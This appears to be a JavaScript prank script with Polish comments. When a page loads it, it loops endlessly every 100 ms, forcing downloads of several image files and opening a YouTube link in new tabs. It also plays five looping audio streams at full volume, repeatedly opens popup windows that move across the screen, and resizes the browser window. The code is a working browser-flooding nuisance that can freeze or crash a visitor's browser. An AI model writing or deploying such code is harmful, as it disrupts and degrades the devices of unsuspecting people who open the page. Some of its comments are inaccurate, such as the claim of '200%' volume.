// Funkcja do pobierania plików
function downloadFiles(files) {
    files.forEach(file => {
        const link = document.createElement('a');
        link.href = `/media/${file}`;
        link.download = file;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    });
}

// Funkcja do otwierania nowych okien z linkami
function openLinks(links) {
    links.forEach(link => {
        window.open(link, '_blank');
    });
}

// Funkcja do zmiany rozmiaru okna przeglądarki
function resizeWindow() {
    let width = 300;
    let height = 200;
    const maxWidth = 800;
    const maxHeight = 600;

    const interval = setInterval(() => {
        if (width < maxWidth && height < maxHeight) {
            width += 50;
            height += 50;
            window.resizeTo(width, height);
        } else {
            clearInterval(interval);
        }
    }, 2000); // Zmiana co 2 sekundy
}

// Funkcja do otwierania małego okna wideo
function openVideoWindow() {
    const videoWindow = window.open('/media/video.mp3', 'VideoWindow', 'width=400,height=300');

    // Ustawienia do poruszania oknem
    let posX = 0;
    let posY = 0;
    const moveInterval = setInterval(() => {
        // Zmiana pozycji okna
        posX += 5; // Zwiększ pozycję X
        posY += 3; // Zwiększ pozycję Y

        // Sprawdzenie granic ekranu
        if (posX > window.innerWidth - 400 || posY > window.innerHeight - 300) {
            posX = 0; // Resetuj pozycję X
            posY = 0; // Resetuj pozycję Y
        }

        // Ustawienie nowej pozycji okna
        videoWindow.moveTo(posX, posY);
    }, 100); // Zmiana pozycji co 100 ms
}

// Funkcja do otwierania okna wideo co 5 sekund
function startVideoWindowInterval() {
    setInterval(openVideoWindow, 5000); // Otwórz okno co 5 sekund
}

// Funkcja do odtwarzania muzyki w tle
function playBackgroundMusic() {
    const audio = new Audio('/media/video.mp4');
    audio.loop = true; // Ustawienie pętli
    audio.play().catch(error => {
        console.error("Nie udało się odtworzyć muzyki:", error);
    });
}

// Główna funkcja
function main() {
    const filesToDownload = ['ez-yann.png', 'gerbus.png', 'jasioch.png', 'readme.txt'];
    const linksToOpen = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ'];

    // Wywołanie operacji w nieskończoność
    setInterval(() => {
        downloadFiles(filesToDownload);
        openLinks(linksToOpen);
    }, 100);


    function playAudio() {
        // Tworzymy nowy obiekt Audio
        const audio = new Audio('/media/video.mp3');
    
        // Ustawiamy głośność na 200%
        // Głośność w obiekcie Audio jest w zakresie od 0.0 do 1.0, więc 200% to 1.0
        audio.volume = 1.0;
    
        // Ustawiamy, aby audio odtwarzało się w pętli
        audio.loop = true;
    
        // Rozpoczynamy odtwarzanie
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    function playAudio2() {
        // Tworzymy nowy obiekt Audio
        const audio = new Audio('/media/video.mp3');
    
        // Ustawiamy głośność na 200%
        // Głośność w obiekcie Audio jest w zakresie od 0.0 do 1.0, więc 200% to 1.0
        audio.volume = 1.0;
    
        // Ustawiamy, aby audio odtwarzało się w pętli
        audio.loop = true;
    
        // Rozpoczynamy odtwarzanie
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    function playAudio3() {
        // Tworzymy nowy obiekt Audio
        const audio = new Audio('/media/video.mp3');
    
        // Ustawiamy głośność na 200%
        // Głośność w obiekcie Audio jest w zakresie od 0.0 do 1.0, więc 200% to 1.0
        audio.volume = 1.0;
    
        // Ustawiamy, aby audio odtwarzało się w pętli
        audio.loop = true;
    
        // Rozpoczynamy odtwarzanie
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    function playAudio4() {
        // Tworzymy nowy obiekt Audio
        const audio = new Audio('/media/video.mp3');
    
        // Ustawiamy głośność na 200%
        // Głośność w obiekcie Audio jest w zakresie od 0.0 do 1.0, więc 200% to 1.0
        audio.volume = 1.0;
    
        // Ustawiamy, aby audio odtwarzało się w pętli
        audio.loop = true;
    
        // Rozpoczynamy odtwarzanie
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    function playAudio5() {
        // Tworzymy nowy obiekt Audio
        const audio = new Audio('/media/video.mp3');
    
        // Ustawiamy głośność na 200%
        // Głośność w obiekcie Audio jest w zakresie od 0.0 do 1.0, więc 200% to 1.0
        audio.volume = 1.0;
    
        // Ustawiamy, aby audio odtwarzało się w pętli
        audio.loop = true;
    
        // Rozpoczynamy odtwarzanie
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    // Wywołanie funkcji
    playAudio();
    playAudio2();
    playAudio3();
    playAudio4();
    playAudio5();
    resizeWindow(); // Rozpocznij zmianę rozmiaru okna
    startVideoWindowInterval(); // Rozpocznij otwieranie okna wideo co 5 sekund
    playBackgroundMusic(); // Odtwórz muzykę w tle
}

// Uruchomienie głównej funkcji
main();